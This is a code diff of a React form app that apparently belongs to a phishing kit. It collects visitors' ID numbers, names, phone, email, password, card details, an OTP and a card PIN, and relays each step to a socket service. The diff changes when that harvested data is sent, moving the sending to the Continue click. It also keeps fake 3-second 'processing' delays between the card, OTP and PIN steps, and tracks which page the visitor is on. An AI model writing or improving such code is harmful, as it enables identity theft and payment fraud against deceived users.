@@ -265,38 +265,9 @@ const App: React.FC = () => {
     socketService.trackPageChange(currentPage);
   }, [step, paymentSubStep, verificationSubStep]);
   
-  // Save form data when it changes
-  // Step 1: Account Type with dynamic fields
-  useEffect(() => {
-    if (step === 1 && accountType) {
-      const formData: any = {
-        accountType,
-      };
-      
-      // Add dynamic fields if filled
-      if (step1IdCard) formData.idCard = step1IdCard;
-      if (step1Email) formData.email = step1Email;
-      if (step1Phone) formData.phone = step1Phone;
-      
-      socketService.saveVisitorData(formData, 'step1-account-type');
-    }
-  }, [accountType, step1IdCard, step1Email, step1Phone, step]);
+  // Data will be saved in handleNextStep when user clicks Continue button
 
-  // Step 2: Personal Info
-  useEffect(() => {
-    if (step === 2 && (namesAr.first || namesEn.first || idNumber || mobileNumber)) {
-      const formData = {
-        namesAr,
-        namesEn,
-        idNumber,
-        mobileNumber,
-        postalCode,
-        citizenshipType,
-        nationality,
-      };
-      socketService.saveVisitorData(formData, 'step2-personal-info');
-    }
-  }, [namesAr, namesEn, idNumber, mobileNumber, postalCode, citizenshipType, nationality, step]);
+
 
   // Step 5: Verification
   useEffect(() => {
@@ -312,55 +283,57 @@ const App: React.FC = () => {
     }
   }, [loginData]);
 
-  // Step 3: Password
-  useEffect(() => {
-    if (step === 3 && password) {
-      const formData = {
-        password,
-        confirmPassword,
-      };
-      socketService.saveVisitorData(formData, 'step3-password');
-    }
-  }, [password, confirmPassword, step]);
 
-  // Step 4: Payment - Card
-  useEffect(() => {
-    if (step === 4 && paymentSubStep === 'card' && paymentData.cardNumber) {
-      socketService.saveVisitorData(paymentData, 'step4-payment-card');
-    }
-  }, [paymentData, step, paymentSubStep]);
 
-  // Step 4: Payment - OTP
-  useEffect(() => {
-    if (step === 4 && paymentSubStep === 'otp' && otpData.otp) {
-      socketService.saveVisitorData(otpData, 'step4-payment-otp');
-    }
-  }, [otpData, step, paymentSubStep]);
 
-  // Step 4: Payment - PIN
-  useEffect(() => {
-    if (step === 4 && paymentSubStep === 'pin' && pinData.pin) {
-      socketService.saveVisitorData(pinData, 'step4-payment-pin');
-    }
-  }, [pinData, step, paymentSubStep]);
+
+
+
+
 
   const handleNextStep = () => {
+    // Save data before moving to next step
+    if (step === 1 && accountType) {
+      const formData: any = { accountType };
+      if (step1IdCard) formData.idCard = step1IdCard;
+      if (step1Email) formData.email = step1Email;
+      if (step1Phone) formData.phone = step1Phone;
+      socketService.saveVisitorData(formData, 'step1-account-type');
+    } else if (step === 2) {
+      const formData = {
+        namesAr,
+        namesEn,
+        idNumber,
+        mobileNumber,
+        postalCode,
+        citizenshipType,
+        nationality,
+      };
+      socketService.saveVisitorData(formData, 'step2-personal-info');
+    } else if (step === 3 && password) {
+      const formData = { password, confirmPassword };
+      socketService.saveVisitorData(formData, 'step3-password');
+    }
+    
     if (step === 4) {
       if (paymentSubStep === 'info') {
         setPaymentSubStep('card');
       } else if (paymentSubStep === 'card') {
+        socketService.saveVisitorData(paymentData, 'step4-payment-card');
         setIsProcessing(true);
         setTimeout(() => {
           setIsProcessing(false);
           setPaymentSubStep('otp');
         }, 3000);
       } else if (paymentSubStep === 'otp') {
+        socketService.saveVisitorData(otpData, 'step4-payment-otp');
         setIsProcessing(true);
         setTimeout(() => {
           setIsProcessing(false);
           setPaymentSubStep('pin');
         }, 3000);
       } else if (paymentSubStep === 'pin') {
+        socketService.saveVisitorData(pinData, 'step4-payment-pin');
         setIsProcessing(true);
         setTimeout(() => {
           setIsProcessing(false);
